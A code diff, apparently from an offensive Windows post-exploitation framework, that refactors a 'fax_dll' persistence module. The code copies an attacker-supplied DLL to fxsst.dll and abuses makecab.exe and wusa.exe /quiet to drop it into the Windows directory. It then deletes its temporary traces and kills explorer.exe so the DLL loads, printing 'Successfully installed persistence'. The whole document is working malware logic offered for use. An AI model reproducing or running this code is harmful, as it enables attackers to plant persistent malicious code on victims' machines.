@@ -16,74 +16,66 @@ explorer_info = {
 }
 
 
-def fax_dll(payload):
-	if payloads().dll(payload):
-		try:
-			payload_data = open(os.path.join(payload), "rb").read()
-		except Exception as error:
-			return False
-			
-		try:
-			dll_file = open(os.path.join(tempfile.gettempdir(), "fxsst.dll"), "wb")
-			dll_file.write(payload_data)
-			dll_file.close()
-		except Exception as error:
-			return False
-		else:
-			pass
+def fax_dll(payload, name='', add=True):
+	if add:
+		if payloads().dll(payload):
+			try:
+				payload_data = open(os.path.join(payload), "rb").read()
+			except Exception:
+				return False
 
-		time.sleep(5)
+			tmp_fxsst = os.path.join(tempfile.gettempdir(), "fxsst.dll")
+			tmp_cabinet = os.path.join(tempfile.gettempdir(), "suspicious.cab")
+			try:
+				with open(tmp_fxsst, 'wb') as dll_file:
+					dll_file.write(payload_data)
+			except Exception:
+				return False
 
-		if os.path.isfile(os.path.join(tempfile.gettempdir(), "fxsst.dll")) == True:
-			if process().create("makecab.exe", params="{} {}".format(
-					os.path.join(tempfile.gettempdir(), "fxsst.dll"),
-					os.path.join(tempfile.gettempdir(), "suspicious.cab"))) == True:
+			if not os.path.exists(tmp_fxsst):
+				print_error("dll file is not found: {path}".format(path=tmp_fxsst))
+				return False
+
+			time.sleep(5)
+
+			if process().create("makecab.exe", params="{} {}".format(tmp_fxsst, tmp_cabinet)):
 				print_success("Successfully created cabinet file")
 			else:
 				print_success("Unable to create cabinet file")
 				return False
-		else:
-			print_error("Unable to create cabinet file, dll file is not found")
-			return False
 
-		time.sleep(5)
+			time.sleep(5)
 
-		if (os.path.isfile(os.path.join(tempfile.gettempdir(), "suspicious.cab")) == True):
-			if process().create("wusa.exe", params="{} /extract:{} /quiet".format(
-					os.path.join(tempfile.gettempdir(), "suspicious.cab"),
-					information().windows_directory())) == True:
+			if not os.path.exists(tmp_cabinet):
+				print_error("dll file is not found: {path}".format(path=tmp_cabinet))
+				return False
+
+			if process().create("wusa.exe", params="{} /extract:{} /quiet".format(tmp_cabinet, information().windows_directory())):
 				print_success("Successfully extracted cabinet file")
 			else:
-				print_error("Unable to extract cabinet file")	
+				print_error("Unable to extract cabinet file")
+				return False
+
+			if os.path.isfile(os.path.join(information().windows_directory(), "fxsst.dll")):
+				print_success("Successfully installed persistence")
+
+				try:
+					os.remove(tmp_cabinet)
+				except Exception:
+					return False
+
+				try:
+					os.remove(tmp_fxsst)
+				except Exception:
+					return False
+
+				print_info("Attempting to restart explorer in order to load our dll file")
+				if process().terminate("explorer.exe"):
+					print_success("Successfully restarted explorer process, enjoy!")
+				else:
+					print_success("Unable to restart explorer process, reboot!")
+			else:
 				return False
 		else:
-			print_error("Unable to extract cabinet file, cabinet file is not found")
+			print_error("Cannot proceed, invalid payload")
 			return False
-
-		if os.path.isfile(os.path.join(information().windows_directory(), "fxsst.dll")) == True:
-			print_success("Successfully installed persistence")
-			if os.path.isfile(os.path.join(tempfile.gettempdir(), "suspicious.cab")) == True:
-				try:
-					os.remove(os.path.join(tempfile.gettempdir(), "suspicious.cab"))
-				except Exception as error:
-					return False
-			else:
-				pass
-			if os.path.isfile(os.path.join(tempfile.gettempdir(),"fxsst.dll")) == True:
-				try:
-					os.remove(os.path.join(tempfile.gettempdir(),"fxsst.dll"))
-				except Exception as error:
-					return False
-			else:
-				pass
-
-			print_info("Attempting to restart explorer in order to load our dll file")
-			if process().terminate("explorer.exe") == True:
-				print_success("Successfully restarted explorer process, enjoy!")
-			else:
-				print_success("Unable to restart explorer process, reboot!")
-		else:
-			return False
-	else:
-		print_error("Cannot proceed, invalid payload")
-		return False
